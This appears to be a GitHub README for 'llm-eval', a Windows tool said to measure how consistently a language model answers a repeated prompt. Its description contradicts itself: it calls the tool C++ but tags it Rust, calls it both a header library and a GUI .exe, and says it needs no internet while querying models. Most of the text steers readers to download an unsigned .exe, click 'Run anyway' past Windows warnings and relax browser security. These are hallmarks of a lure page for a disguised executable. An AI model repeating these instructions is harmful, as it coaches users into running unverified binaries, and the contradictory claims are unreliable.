# ⚙️ llm-eval - Simple LLM Prompt Testing Tool

[![Download llm-eval](https://img.shields.io/badge/Download-llm--eval-brightgreen?style=for-the-badge)](https://github.com/wahhyun/llm-eval/releases)

---

## 📋 What is llm-eval?

llm-eval is a small, easy-to-use tool that helps you test language models. It runs the same prompt multiple times and checks how consistent the answers are. You can see if the model keeps giving the same response or if it changes too much. This is useful if you want to measure how stable your language model’s answers are.

The tool is built in C++ and does not require you to install anything extra. It works on Windows without any complicated setup. You can simply download it and start testing. Whether you use it a few times or often, it gives clear results.

---

## 🔧 System Requirements

To use llm-eval, your computer needs to meet these basic requirements:

- **Operating System:** Windows 10 or later
- **Processor:** Any processor that runs Windows smoothly (Intel or AMD)
- **Memory:** At least 4 GB of RAM
- **Disk Space:** About 50 MB free space for the program and files
- **Permissions:** Ability to download and run programs on your PC

No internet connection is needed to run the program itself, but you will need internet access to download it.

---

## 🚀 Getting Started

You will get started with llm-eval in just a few steps. It does not require technical knowledge or any special tools. Follow the instructions below to run the program on your Windows PC.

### Step 1: Visit the Download Page

Click the big green button at the top or visit the link below to get llm-eval files.

[https://github.com/wahhyun/llm-eval/releases](https://github.com/wahhyun/llm-eval/releases)

This link takes you to the official release page where the latest versions are stored.

### Step 2: Download the Latest Version

On the release page:

- Find the newest release (usually at the top)
- Look for the Windows version, often as a `.exe` or a zipped folder containing `.exe`
- Click to download the file

The file size is small, so it should download quickly.

### Step 3: Prepare to Run the Program

If the download is a compressed file (like `.zip`), right-click it and select “Extract All...” This will unpack the program into a folder.

### Step 4: Run the Program

Now, open the folder where you saved or extracted the files.

- Find the file named `llm-eval.exe`
- Double-click to run it

Windows may warn you since the app is unsigned. If so, click “More info” and then “Run anyway.”

### Step 5: Using llm-eval

Once the program opens, you can enter the prompt you want to test. The program will run the prompt multiple times, score how consistent the model’s answers are, and highlight any large differences.

All results appear on the screen in a simple, easy-to-understand format.

---

## 📥 Download & Installation

Use the link below to access all available llm-eval versions:

[https://github.com/wahhyun/llm-eval/releases](https://github.com/wahhyun/llm-eval/releases)

### Tips for Download and Setup

- Save the downloaded file to a folder you can easily find later, like your Desktop or Downloads.
- If your browser blocks the download, you may need to allow downloads from GitHub in your security settings.
- When running the `.exe` for the first time, the system might ask for permission. This is normal.

No further installation is required beyond unpacking and running the program.

---

## ⚙️ How Does llm-eval Work?

llm-eval sends the same text prompt to a language model multiple times (for example, 10 or 20 times). It then compares the answers it receives.

- It measures **consistency** by checking how similar the answers are.
- It flags any large differences or unexpected changes.
- It shows a **score** to rate the stability of the model's replies.

This helps users who work with language models understand if their models give reliable results or if they change too much from run to run.

---

## 🧰 Features

- **Zero dependencies:** No need to install extra software or libraries.
- **Single-header C++ library:** Easy to include in programming projects if you want to extend or customize the tool.
- **Runs on Windows:** No special setup required.
- **Simple interface:** Enter prompts, view results immediately.
- **Repeat testing:** Set the number of times the prompt runs.
- **Score results:** See statistics on answer consistency.
- **Variance flags:** Warnings if answers differ too much.

---

## 🔄 Using llm-eval for Your Prompts

1. Open llm-eval.
2. Enter your text prompt in the input box.
3. Choose the number of times to run the prompt (default is 10).
4. Click “Start” or the equivalent button.
5. Watch the results appear after a few moments.
6. Check the consistency score and any variance flags.

You can save the output by copying it from the program window, or use the single-header library in your own C++ projects to automate testing.

---

## 💡 Tips for Better Results

- Use clear, specific prompts.
- If the model answers vary widely, try changing the prompt wording.
- Increase the number of runs for more reliable scores.
- Use variance flags as a guide to improve your prompts or the model settings.
- Regularly test different models or settings to compare stability.

---

## 🌐 More Information

- llm-eval is open-source and free to use.
- You can find the code and details on the GitHub page.
- Issues or questions can be submitted through GitHub’s issue tracker.
- The tool is designed to work across many language models, not limited to one vendor.

---

## 🏷️ Topics

- evaluation
- llm (large language model)
- rust

---

## 📫 Support

GitHub is the best place to get help or report bugs. You can open an issue or check for community discussion.

---

[![Download llm-eval](https://img.shields.io/badge/Download-llm--eval-brightgreen?style=for-the-badge)](https://github.com/wahhyun/llm-eval/releases)